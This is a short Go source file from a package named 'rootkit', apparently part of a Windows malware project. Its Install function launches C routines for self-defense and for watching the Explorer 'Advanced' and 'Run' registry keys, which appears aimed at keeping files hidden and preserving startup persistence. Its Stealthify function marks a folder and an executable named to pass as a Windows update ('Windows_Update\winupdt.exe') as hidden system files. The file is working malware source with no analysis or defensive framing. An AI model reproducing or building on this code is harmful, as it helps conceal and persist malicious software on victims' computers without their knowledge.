package rootkit

import (
	"os/exec"
	/*
		extern _Bool SelfDefense();
		extern void hideFiles();
		extern void fixStartup();
		extern void WatchReg(char *watch, _Bool watchType);
	*/
	"C"
)

func Install() {
	go C.SelfDefense();
	go C.WatchReg(C.CString("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"), true);
	go C.WatchReg(C.CString("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), false);
	go Stealthify()
}

func Stealthify() {
	run("attrib +S +H %APPDATA%\\Windows_Update")
	run("attrib +S +H %APPDATA%\\Windows_Update\\winupdt.exe")
}

func run(cmd string) {
	exec.Command("cmd", "/C", cmd).Run()
}